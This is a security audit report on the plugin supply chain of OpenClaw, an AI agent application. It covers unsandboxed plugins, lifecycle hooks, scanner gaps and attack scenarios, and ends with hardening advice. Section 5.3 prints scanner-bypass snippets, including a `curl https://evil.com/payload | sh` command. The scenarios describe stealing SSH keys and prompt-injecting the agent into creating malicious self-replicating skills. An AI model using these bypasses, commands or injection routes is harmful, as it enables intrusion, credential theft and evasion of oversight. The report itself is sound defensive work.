# Phase 3: Plugin Supply Chain Security Analysis

## OpenClaw Security Study — Plugin and Skill System

---

## 1. Executive Summary

OpenClaw's plugin system is the single largest attack surface in the entire application. With over 275KB of plugin infrastructure code, 75KB of plugin SDK, and 48 bundled skills shipping with the core product, the plugin ecosystem represents a deeply integrated extension mechanism that operates **in-process with no sandboxing**.

The critical finding is architectural: plugins execute with the same privilege level as the host application. The plugin SDK explicitly provides capabilities for running shell commands (`run-command.ts`), accessing the filesystem (`json-store.ts`, `file-lock.ts`, `temp-path.ts`), performing authenticated network requests (`fetch-auth.ts`), and hooking into every stage of the agent lifecycle. Combined with npm-based distribution and a community marketplace (ClawHub), this creates a supply chain attack surface where a single malicious or compromised plugin can achieve full system compromise.

The existing security scanner (`skill-scanner.ts`) provides only regex-based static analysis of JS/TS files, skips `node_modules` entirely, caps scanning at 500 files, and cannot detect obfuscated, runtime-generated, or dependency-chain attacks. It is a speed bump, not a barrier.

**Overall Risk Rating: CRITICAL**

---

## 2. Plugin Architecture

### 2.1 Installation Flow

Plugins follow an npm-based distribution model:

```
Discovery (discovery.ts, 17KB)
    |
    v
Registry Lookup (registry.ts, 14KB / http-registry.ts)
    |
    v
Manifest Validation (manifest.ts, 5KB + manifest-registry.ts, 8KB)
    |
    v
npm Install (install.ts, 15KB)
    |
    v
Security Scan (skill-scanner.ts — static regex only)
    |
    v
Plugin Loading (loader.ts, 22KB)
    |
    v
Hook Registration (hooks.ts, 23KB)
    |
    v
Tool Registration (tools.ts, 4KB)
    |
    v
IN-PROCESS EXECUTION (no sandbox, no isolation)
```

Key architectural files and their roles:

| File | Size | Role |
|------|------|------|
| `loader.ts` | 22KB | Loads plugin code into the host process |
| `install.ts` | 15KB | Manages npm-based plugin installation |
| `discovery.ts` | 17KB | Discovers plugins from registries and ClawHub |
| `registry.ts` | 14KB | Local plugin registry management |
| `hooks.ts` | 23KB | Lifecycle hook registration and dispatch |
| `manifest.ts` / `manifest-registry.ts` | 13KB | Plugin manifest parsing and validation |
| `types.ts` | 21KB | Type definitions for the plugin system |
| `update.ts` | 13KB | Plugin update mechanism |
| `config-state.ts` | 7KB | Plugin configuration state management |
| `path-safety.ts` | 0.8KB | Path traversal protection (minimal) |

### 2.2 Execution Model

Plugins run **in-process** with the main OpenClaw application. This is confirmed by multiple SDK capabilities that would be impossible under a sandboxed model:

- Direct filesystem access via `json-store.ts`, `file-lock.ts`, `temp-path.ts`, `config-paths.ts`
- Shell command execution via `run-command.ts`
- Authenticated HTTP requests via `fetch-auth.ts`
- Direct hook into agent message processing via `hooks.ts`

There is no process isolation, no capability-based security model, no seccomp/AppArmor/namespace restrictions, and no resource limits enforced on plugin execution.

### 2.3 Plugin Slots

The `slots.ts` (3KB) system defines named extension points. Notably, **memory is a special slot** — meaning plugins can replace or intercept the agent's memory system entirely. This allows a malicious plugin to:

- Read all agent memory and conversation history
- Modify memories to influence future agent behavior
- Exfiltrate accumulated personal data from memory storage

---

## 3. Plugin Capabilities

The plugin SDK (`src/plugin-sdk/`, ~75KB) grants plugins an extensive set of capabilities:

### 3.1 System Access

| Capability | SDK File | Risk Level |
|-----------|----------|------------|
| Run arbitrary shell commands | `run-command.ts` (1.1KB) | **CRITICAL** |
| Read/write persistent JSON data | `json-store.ts` | HIGH |
| File locking (implies file I/O) | `file-lock.ts` (4.5KB) | HIGH |
| Temporary file creation | `temp-path.ts` | MEDIUM |
| Configuration file access | `config-paths.ts` | HIGH |

### 3.2 Network Access

| Capability | SDK File | Risk Level |
|-----------|----------|------------|
| Authenticated HTTP requests | `fetch-auth.ts` (2KB) | **CRITICAL** |
| Webhook endpoints (inbound) | `webhook-path.ts`, `webhook-targets.ts` | HIGH |
| SSRF "protection" (advisory only) | `ssrf-policy.ts` (2.4KB) | LOW (mitigation) |

### 3.3 Agent Integration

| Capability | SDK File | Risk Level |
|-----------|----------|------------|
| Tool registration (new agent tools) | `tool-send.ts` | HIGH |
| Lifecycle hooks (8+ hook types) | via `hooks.ts` | **CRITICAL** |
| Reply payload manipulation | `reply-payload.ts` | HIGH |
| Text processing/chunking | `text-chunking.ts` | LOW |
| Deduplication logic | `persistent-dedupe.ts` | LOW |

### 3.4 Authentication and Access Control

| Capability | SDK File | Risk Level |
|-----------|----------|------------|
| Command authorization | `command-auth.ts` (2.8KB) | HIGH |
| Access control lists | `allow-from.ts` | MEDIUM |
| Group access management | `group-access.ts` | MEDIUM |
| Pairing access (device pairing) | `pairing-access.ts` | HIGH |

### 3.5 External Service Integration

| Capability | SDK File | Risk Level |
|-----------|----------|------------|
| Slack message actions | `slack-message-actions.ts` | MEDIUM |
| Plugin onboarding flows | `onboarding.ts` | LOW |
| Status reporting | `status-helpers.ts` | LOW |

### 3.6 Capability Summary

A plugin has access to: the shell, the filesystem, the network (with auth tokens), all agent messages, agent memory, device pairing, and webhook infrastructure. This is functionally equivalent to **full local code execution with the user's privileges**.

---

## 4. Supply Chain Attack Surface

### 4.1 npm Distribution

Plugins are distributed as npm packages. This inherits all npm supply chain risks:

- **Dependency confusion**: An attacker publishes a package with the same name as a private/internal plugin to the public npm registry.
- **Typosquatting**: Packages with names similar to popular OpenClaw plugins (e.g., `openclaw-slack` vs `openclaw-slak`).
- **Compromised maintainer accounts**: A single compromised npm account for a popular plugin grants access to all users who update.
- **Transitive dependencies**: A plugin's dependencies (and their dependencies) are not scanned by the security scanner, which skips `node_modules`.
- **Post-install scripts**: npm packages can execute arbitrary code during `npm install` via `postinstall` scripts — this runs *before* any security scanning occurs.

### 4.2 ClawHub Marketplace

ClawHub is the community marketplace where anyone can publish plugins. This creates a classic marketplace trust problem:

- **No code review requirement**: Plugins can be published without security review.
- **Trust by proximity**: Users may assume ClawHub plugins are vetted because they appear in the official marketplace.
- **Reputation gaming**: New accounts can publish malicious plugins with fabricated download counts or reviews.
- **Update attacks**: A legitimate plugin can push a malicious update after establishing trust.
- **Name squatting**: Registering plugin names that imply official status (e.g., "openclaw-security-patch").

### 4.3 The skill-creator Skill

OpenClaw ships with a bundled skill called `skill-creator` that can **create new skills programmatically**. This is a force multiplier for attacks:

- A malicious plugin could use `skill-creator` to generate additional malicious skills.
- An LLM prompt injection attack could instruct the agent to create a skill with malicious code.
- The created skill inherits all plugin SDK capabilities, including shell access.
- This effectively creates the potential for self-replicating malicious code within the OpenClaw ecosystem.

### 4.4 Dependency Chain Depth

With 48 bundled skills, each potentially pulling in dozens of npm dependencies, the transitive dependency surface is enormous. A conservative estimate:

```
48 skills x ~20 direct dependencies x ~5 transitive deps = ~4,800 packages
```

Any one of these 4,800+ packages could be compromised. The security scanner does not inspect any of them.

---

## 5. Security Scanner Limitations

The skill scanner (`skill-scanner.ts`) from Phase 2 provides the only automated security gate for plugins. Its limitations are severe:

### 5.1 Detection Capabilities

The scanner checks for:
- `child_process` usage
- `eval()` calls
- Crypto mining patterns
- Environment variable harvesting combined with network access
- Obfuscated code patterns
- Suspicious WebSocket usage
- Data exfiltration patterns

### 5.2 Fundamental Limitations

| Limitation | Impact |
|-----------|--------|
| **Regex-based static analysis only** | Cannot detect runtime code generation, `Function()` constructor calls, or `import()` expressions |
| **Only scans JS/TS files** | Misses native addons (.node), WebAssembly (.wasm), shell scripts, Python scripts, or any non-JS payload |
| **Skips node_modules entirely** | All transitive dependencies are invisible to the scanner |
| **500 file cap** | A plugin with a large dependency tree could exceed this limit, leaving files unscanned |
| **No behavioral analysis** | Cannot detect malicious behavior that emerges from combining benign-looking operations |
| **No data flow analysis** | Cannot trace how data flows from sensitive sources to network sinks |
| **No signature verification** | Does not verify that plugin code matches a signed manifest |
| **Run after install** | npm `postinstall` scripts execute before the scanner runs |

### 5.3 Bypass Techniques

The following techniques would evade the scanner:

```javascript
// 1. Dynamic import (not caught by regex for child_process)
const mod = await import('child' + '_process');

// 2. Character code construction
const fn = String.fromCharCode(101,118,97,108); // "eval"
globalThis[fn]('malicious code');

// 3. Buffer-based obfuscation
const cmd = Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString();

// 4. Dependency-based attack (scanner skips node_modules)
// package.json: { "dependencies": { "totally-legit-utils": "^1.0.0" } }
// totally-legit-utils contains the malicious code

// 5. WebAssembly payload (scanner only checks JS/TS)
const wasmModule = await WebAssembly.instantiate(wasmBuffer);
wasmModule.instance.exports.exfiltrate();

// 6. Delayed execution (no runtime monitoring)
setTimeout(() => { /* malicious code */ }, 86400000); // 24 hours later

// 7. Plugin SDK abuse (run-command.ts is a legitimate API)
import { runCommand } from '@openclaw/plugin-sdk';
await runCommand('curl https://evil.com/payload | sh');
```

Technique 7 is particularly notable: the plugin SDK's own `run-command.ts` is a **legitimate API** for shell execution. A plugin using it to run arbitrary commands is exercising a designed capability, not exploiting a vulnerability. The scanner has no basis to flag this.

---

## 6. Bundled Skills Risk Analysis

Of the 48 bundled skills, several warrant special attention due to the sensitivity of the systems they interact with:

### 6.1 Critical Risk Skills

#### 1password
- **Access**: Password vault, credentials, secrets, TOTP codes
- **Risk**: A compromised 1password skill has access to the user's entire credential store. Exfiltration of vault contents would be catastrophic.
- **Attack vector**: Hook into the 1password skill's tool calls via `after-tool-call` lifecycle hook to silently copy retrieved credentials.

#### coding-agent
- **Access**: Source code, development environment, potentially CI/CD secrets
- **Risk**: Can read/write arbitrary source code, potentially inject backdoors into the user's projects.
- **Attack vector**: Modify source code during "coding assistance" to introduce subtle vulnerabilities.

#### camsnap (Camera)
- **Access**: Device camera
- **Risk**: Unauthorized image capture, visual surveillance of the user's environment.
- **Attack vector**: Trigger camera capture during routine operations and exfiltrate images.

#### openhue (Smart Home)
- **Access**: Philips Hue smart lighting, potentially other smart home devices
- **Risk**: Physical security implications — an attacker can determine occupancy patterns, disable security lighting, or signal physical intrusion timing.
- **Attack vector**: Monitor light state changes to build occupancy profiles; disable lights during a physical intrusion.

### 6.2 High Risk Skills

| Skill | Access | Primary Risk |
|-------|--------|-------------|
| `slack` | Workspace messages, files, channels | Corporate data exfiltration |
| `discord` | Server messages, DMs, voice channels | Social engineering, data theft |
| `github` / `gh-issues` | Repositories, issues, PRs, secrets | Source code theft, supply chain attack |
| `notion` | Documents, databases, workspaces | Intellectual property theft |
| `obsidian` | Personal knowledge base | Personal data exfiltration |
| `apple-notes` / `bear-notes` | Personal notes | Personal data exfiltration |
| `apple-reminders` / `things-mac` | Schedules, tasks | Behavioral profiling |
| `imsg` / `bluebubbles` / `wacli` | iMessage, WhatsApp messages | Communication interception |
| `himalaya` | Email | Email access, phishing |
| `spotify-player` / `sonoscli` | Audio devices | Audio surveillance potential |
| `voice-call` | Voice communication | Voice interception |
| `trello` | Project management data | Business intelligence theft |

### 6.3 Messaging Skills as a Special Concern

OpenClaw ships with **four** messaging-related skills: `imsg`, `bluebubbles`, `wacli`, and `slack`. A malicious plugin hooking into these skills via lifecycle hooks could:

1. Read all incoming/outgoing messages across platforms
2. Send messages impersonating the user
3. Exfiltrate message history to external servers
4. Modify messages in transit (via `message` lifecycle hook)

### 6.4 The `oracle` and `sag` Skills

These skills (names suggesting advisory/analysis functions) likely have broad data access for their analytical capabilities. Without precise scoping, they represent ambient authority risks.

---

## 7. Plugin Lifecycle Hooks as Attack Surface

The hook system (`hooks.ts`, 23KB) is one of the most powerful — and dangerous — aspects of the plugin architecture. Plugins can register hooks at eight or more lifecycle points:

### 7.1 Hook Types and Attack Potential

| Hook | Trigger | Attack Potential |
|------|---------|-----------------|
| `before-agent-start` | Agent initialization | Modify agent configuration, inject system prompts, alter model selection |
| `after-tool-call` | After any tool executes | Intercept tool results, steal data returned by other skills (e.g., passwords from 1password), modify results |
| `message` | Every message processed | Read all user/agent messages, modify messages in transit, inject hidden instructions |
| `session` | Session lifecycle events | Track user sessions, persist across restarts, establish C2 channels |
| `subagent` | Sub-agent creation | Intercept or modify sub-agent behavior, inject into delegated tasks |
| `compaction` | Memory compaction | Access and modify agent memory during consolidation, inject false memories |
| `gateway` | Gateway/API requests | Man-in-the-middle API calls, intercept authentication tokens |
| `llm` | LLM API calls | Read/modify prompts sent to LLMs, intercept responses, prompt injection |

### 7.2 Hook Chaining Attacks

Because multiple plugins can register hooks at the same lifecycle point, an attacker can exploit hook ordering:

1. **Plugin A** (legitimate): Retrieves a password from 1password via tool call.
2. **Plugin B** (malicious): Registered an `after-tool-call` hook that fires after Plugin A's tool returns. Plugin B reads the password from the tool result and exfiltrates it.

The `message` hook is especially dangerous because it fires on **every message**, giving a malicious plugin a continuous stream of all user-agent communication.

### 7.3 The `llm` Hook: Prompt Injection Multiplier

The `llm` hook allows plugins to intercept and modify prompts before they are sent to the language model. This enables:

- **Persistent prompt injection**: Silently append instructions to every LLM call
- **Model behavior modification**: Alter system prompts to change agent personality or bypass safety guardrails
- **Response manipulation**: Modify LLM responses before the user sees them
- **Exfiltration via prompts**: Encode stolen data into prompts sent to attacker-controlled LLM endpoints

---

## 8. Risk Matrix

### 8.1 Threat Likelihood vs. Impact

| Threat | Likelihood | Impact | Overall Risk |
|--------|-----------|--------|-------------|
| Malicious ClawHub plugin | HIGH | CRITICAL | **CRITICAL** |
| npm dependency compromise | MEDIUM | CRITICAL | **CRITICAL** |
| Legitimate plugin turned malicious (update attack) | MEDIUM | CRITICAL | **HIGH** |
| Lifecycle hook abuse by installed plugin | HIGH | HIGH | **HIGH** |
| skill-creator exploitation via prompt injection | MEDIUM | HIGH | **HIGH** |
| Bundled skill compromise (supply chain) | LOW | CRITICAL | **HIGH** |
| Scanner bypass by sophisticated attacker | HIGH | HIGH | **HIGH** |
| Cross-plugin data theft via hooks | HIGH | HIGH | **HIGH** |
| Memory slot replacement | MEDIUM | CRITICAL | **HIGH** |
| postinstall script attack | MEDIUM | CRITICAL | **HIGH** |
| Native addon / WASM payload (unscanned) | LOW | CRITICAL | **MEDIUM** |

### 8.2 STRIDE Analysis for Plugin System

| Category | Threat | Status |
|----------|--------|--------|
| **Spoofing** | Plugin impersonating another plugin or core component | No mitigation (no code signing) |
| **Tampering** | Plugin modifying agent behavior via hooks | No mitigation (hooks have full access) |
| **Repudiation** | Malicious plugin actions not attributable | No audit logging of plugin actions |
| **Information Disclosure** | Plugin reading data from other plugins' tool calls | No mitigation (shared process space) |
| **Denial of Service** | Plugin consuming unlimited resources | No resource limits |
| **Elevation of Privilege** | Plugin accessing capabilities beyond declared scope | No capability restrictions (SDK grants all) |

---

## 9. Attack Scenarios

### Scenario 1: The Trojan Productivity Plugin

**Vector**: ClawHub marketplace
**Difficulty**: Low
**Impact**: Full system compromise

1. Attacker publishes "openclaw-super-summarizer" on ClawHub — a plugin that summarizes web pages.
2. The plugin legitimately uses `fetch-auth.ts` for web requests and `text-chunking.ts` for processing.
3. The security scanner finds nothing suspicious — the plugin uses only sanctioned SDK APIs.
4. After installation, the plugin registers a `message` hook.
5. Via the `message` hook, it silently exfiltrates all user-agent conversations to an external endpoint using the legitimate `fetch-auth.ts` capability.
6. Using `run-command.ts`, it periodically runs `cat ~/.ssh/id_rsa` and exfiltrates SSH keys.

**Why the scanner misses it**: The plugin uses only official SDK APIs. There is no `child_process` import, no `eval()`, no obfuscated code. The scanner has no concept of "data flowing from message hook to network request."

### Scenario 2: The Credential Harvester

**Vector**: Lifecycle hook abuse
**Difficulty**: Low
**Impact**: Full credential compromise

1. A seemingly benign plugin (e.g., a weather dashboard) registers an `after-tool-call` hook.
2. The hook inspects every tool call result across all plugins.
3. When the 1password skill returns credentials, the hook captures them.
4. When the github skill returns API tokens, the hook captures them.
5. When the slack skill returns OAuth tokens, the hook captures them.
6. Captured credentials are written to `json-store.ts` (persistent storage) and periodically exfiltrated via webhook.

**Why this works**: The `after-tool-call` hook receives the results of ALL tool calls, not just the registering plugin's own calls. There is no access control on hook data.

### Scenario 3: The Self-Replicating Skill

**Vector**: skill-creator + prompt injection
**Difficulty**: Medium
**Impact**: Persistent compromise

1. Attacker sends a carefully crafted message to the user (e.g., via email or chat link) that contains a prompt injection payload.
2. The agent processes the message and, influenced by the injection, invokes the `skill-creator` skill.
3. `skill-creator` generates a new skill with embedded malicious code.
4. The new skill registers hooks and begins operating as in Scenarios 1 or 2.
5. Even if the original prompt injection is discovered and the triggering message is deleted, the created skill persists.
6. The created skill can itself invoke `skill-creator` to generate additional malicious skills as backup persistence mechanisms.

### Scenario 4: The Dependency Chain Attack

**Vector**: npm transitive dependency
**Difficulty**: Medium
**Impact**: Pre-scan code execution

1. Attacker identifies a low-download npm package used as a transitive dependency by a popular OpenClaw plugin.
2. Attacker compromises the package maintainer's npm account (or buys the abandoned package name).
3. Attacker publishes a new version with a `postinstall` script that executes during `npm install`.
4. When the OpenClaw plugin is installed or updated, the malicious `postinstall` runs.
5. The code executes **before** the security scanner runs (scanner operates post-install).
6. The scanner would not detect it anyway — it skips `node_modules`.

### Scenario 5: The Smart Home Stalker

**Vector**: openhue skill + lifecycle hooks
**Difficulty**: Low
**Impact**: Physical security compromise

1. A malicious plugin registers hooks on the openhue skill's tool calls.
2. By monitoring light on/off patterns, the plugin builds an occupancy model of the user's home.
3. The plugin exfiltrates this data: "Lights off at 11pm, on at 7am. Away from home Tuesdays 6-9pm."
4. Combined with data from apple-reminders (calendar/schedule) and messaging skills (travel plans), the attacker builds a complete behavioral profile.
5. This information is sold or used to plan physical intrusion during known absence windows.

---

## 10. Recommendations

### 10.1 Critical (Implement Immediately)

#### R1: Plugin Sandboxing
Isolate plugins in separate processes with restricted capabilities. Options include:
- **Node.js Worker Threads** with restricted `workerData` (minimum viable)
- **Separate Node.js processes** with IPC (better isolation)
- **V8 isolates** via `isolated-vm` (strong isolation, maintained performance)
- **Containerized execution** via lightweight containers (strongest isolation)

Each plugin should declare required capabilities in its manifest, and only those capabilities should be available in the sandbox.

#### R2: Capability-Based Permission Model
Replace the current "all or nothing" SDK access with explicit capability declarations:

```yaml
# Example manifest capability declaration
capabilities:
  network:
    - domain: "api.weather.com"
      methods: ["GET"]
  filesystem:
    - path: "$PLUGIN_DATA_DIR"
      access: "read-write"
  hooks:
    - "message"  # only hooks explicitly requested
  commands: false  # no shell access
  camera: false
  credentials: false
```

Users should be prompted to approve capabilities at install time, similar to mobile app permission models.

#### R3: Hook Data Isolation
The `after-tool-call` hook must **not** receive data from other plugins' tool calls. Each plugin's hooks should only see data from its own tool invocations. The `message` hook should require explicit user consent and display a persistent indicator when active.

#### R4: Eliminate Pre-Scan Code Execution
- Block npm `postinstall` scripts during plugin installation (use `--ignore-scripts`)
- Run the security scan on the downloaded package **before** any code execution
- Scan `node_modules` contents, not just the top-level plugin code

### 10.2 High Priority

#### R5: Enhanced Security Scanner
- Implement AST-based analysis instead of regex (use `@babel/parser` or `ts-morph`)
- Add data flow analysis to detect source-to-sink patterns (credential access to network)
- Scan all file types, not just JS/TS (check for .node, .wasm, .sh, .py files)
- Remove the 500-file cap or make it configurable with warnings
- Add behavioral signatures beyond string matching

#### R6: Plugin Code Signing
- Require cryptographic signatures on plugin packages
- Verify signatures before installation and on every load
- Maintain a revocation list for compromised plugins
- ClawHub should sign verified plugins with its own key as a second factor

#### R7: Restrict skill-creator
- Require explicit user confirmation with full code review before any skill is created
- Created skills should go through the same security scanning as installed plugins
- Rate-limit skill creation to prevent automated mass-generation
- Log all skill-creator invocations to an audit trail

#### R8: Runtime Monitoring
- Implement runtime behavior monitoring for installed plugins
- Track network connections, file access patterns, and command execution
- Alert on anomalous behavior (e.g., a weather plugin accessing ~/.ssh)
- Maintain an audit log of all plugin actions, accessible to the user

### 10.3 Medium Priority

#### R9: Dependency Auditing
- Integrate `npm audit` into the plugin installation flow
- Maintain a deny-list of known-compromised packages
- Pin transitive dependency versions to prevent silent updates
- Consider using a dependency proxy/mirror for ClawHub plugins

#### R10: Bundled Skill Hardening
- Apply least-privilege to each of the 48 bundled skills
- The 1password skill should have zero network access — it only needs local vault interaction
- The camsnap skill should require per-invocation user confirmation
- Messaging skills should operate in a restricted data context

#### R11: ClawHub Marketplace Security
- Implement mandatory automated security scanning for all published plugins
- Require 2FA for plugin publisher accounts
- Add a review period for new plugins before they appear in search results
- Implement a bug bounty program for plugin security issues
- Display security audit status and last-scanned date on plugin listings

#### R12: Memory Slot Protection
- The memory slot should not be replaceable by third-party plugins without explicit user consent and prominent warnings
- Memory slot plugins should be audited to a higher standard
- Consider making the memory system a privileged component outside the normal plugin architecture

### 10.4 Architectural Considerations

The fundamental issue is that OpenClaw's plugin system was designed for maximum developer convenience and integration depth, with security as an afterthought. The `path-safety.ts` file at 0.8KB — the smallest file in the plugin directory — is a telling indicator of the security investment relative to functionality.

A defense-in-depth approach is essential:

```
Layer 1: Marketplace vetting (ClawHub review)
Layer 2: Static analysis (enhanced scanner)
Layer 3: Install-time protection (no postinstall, dependency audit)
Layer 4: Capability restrictions (declared permissions)
Layer 5: Runtime isolation (sandboxed execution)
Layer 6: Runtime monitoring (behavioral analysis)
Layer 7: Audit logging (forensic capability)
```

Currently, only Layer 2 exists in a limited form. Layers 1 and 3-7 are absent.

---

## Appendix A: File Inventory

### Plugin Infrastructure (`src/plugins/`)

| File | Size | Function |
|------|------|----------|
| `hooks.ts` | 23KB | Lifecycle hook system |
| `loader.ts` | 22KB | Plugin loading |
| `types.ts` | 21KB | Type definitions |
| `discovery.ts` | 17KB | Plugin discovery |
| `install.ts` | 15KB | Installation |
| `registry.ts` | 14KB | Plugin registry |
| `update.ts` | 13KB | Update mechanism |
| `commands.ts` | 8.5KB | Plugin commands |
| `manifest-registry.ts` | 8KB | Manifest registry |
| `config-state.ts` | 7KB | Configuration state |
| `uninstall.ts` | 6KB | Removal |
| `manifest.ts` | 5KB | Manifest parsing |
| `tools.ts` | 4KB | Tool registration |
| `slots.ts` | 3KB | Extension slots |
| `services.ts` | 2KB | Services |
| `path-safety.ts` | 0.8KB | Path safety |
| `http-registry.ts` | — | HTTP routes |
| `http-path.ts` | — | HTTP paths |
| `bundled-dir.ts` | — | Bundled plugin directory |
| `bundled-sources.ts` | — | Bundled plugin sources |
| `runtime/` | — | Plugin runtime |

### Plugin SDK (`src/plugin-sdk/`)

| File | Size | Function |
|------|------|----------|
| `index.ts` | 21KB | Main SDK entry |
| `file-lock.ts` | 4.5KB | File locking |
| `command-auth.ts` | 2.8KB | Command auth |
| `ssrf-policy.ts` | 2.4KB | SSRF protection |
| `fetch-auth.ts` | 2KB | Authenticated fetch |
| `run-command.ts` | 1.1KB | Shell command execution |
| `json-store.ts` | — | Persistent storage |
| `tool-send.ts` | — | Tool sending |
| `webhook-path.ts` | — | Webhook paths |
| `webhook-targets.ts` | — | Webhook targets |
| `allow-from.ts` | — | Access control |
| `group-access.ts` | — | Group access |
| `temp-path.ts` | — | Temp files |
| `config-paths.ts` | — | Config paths |
| `pairing-access.ts` | — | Device pairing |
| `slack-message-actions.ts` | — | Slack integration |
| `onboarding.ts` | — | Onboarding |
| `persistent-dedupe.ts` | — | Deduplication |
| `reply-payload.ts` | — | Reply payloads |
| `status-helpers.ts` | — | Status helpers |
| `text-chunking.ts` | — | Text chunking |

### Bundled Skills (48 total)

**Credential/Security**: 1password
**Development**: coding-agent, github, gh-issues, clawhub, skill-creator
**Communication**: slack, discord, imsg, bluebubbles, wacli, himalaya, voice-call
**Productivity**: notion, obsidian, apple-notes, bear-notes, apple-reminders, things-mac, trello, canvas
**Media**: camsnap, peekaboo, video-frames, openai-image-gen, gifgrep, songsee
**Audio/Voice**: openai-whisper, openai-whisper-api, sherpa-onnx-tts, spotify-player, sonoscli
**Smart Home**: openhue
**AI/LLM**: gemini, oracle, sag, openai-image-gen
**Utilities**: weather, xurl, goplaces, healthcheck, session-logs, model-usage, summarize, blogwatcher
**System**: tmux, nano-banana-pro, nano-pdf, eightctl, blucli, gog, ordercli, mcporter

---

## Appendix B: Comparison with Industry Standards

| Security Control | VS Code Extensions | Chrome Extensions | Mobile Apps | OpenClaw Plugins |
|-----------------|-------------------|-------------------|-------------|-----------------|
| Sandboxed execution | Partial (Extension Host) | Yes (Content Script isolation) | Yes (App Sandbox) | **No** |
| Declared permissions | Yes (package.json) | Yes (manifest.json) | Yes (AndroidManifest/Info.plist) | **No** |
| User permission prompt | Some (workspace trust) | Yes (install-time) | Yes (runtime) | **No** |
| Code signing | Yes (marketplace) | Yes (CRX signing) | Yes (mandatory) | **No** |
| Marketplace review | Yes (automated + manual) | Yes (automated + manual) | Yes (App Store Review) | **No** |
| Runtime monitoring | Limited | Yes (CSP, API limits) | Yes (OS-level) | **No** |
| Process isolation | Yes (separate process) | Yes (separate process) | Yes (separate process) | **No** |
| Capability restrictions | Yes (API surface) | Yes (permissions API) | Yes (entitlements) | **No** |

OpenClaw's plugin system lacks every standard security control that industry peers have adopted. This is the most significant finding of this analysis.

---

*Phase 3 of the OpenClaw Security Study. Analysis based on code structure and SDK interface review.*
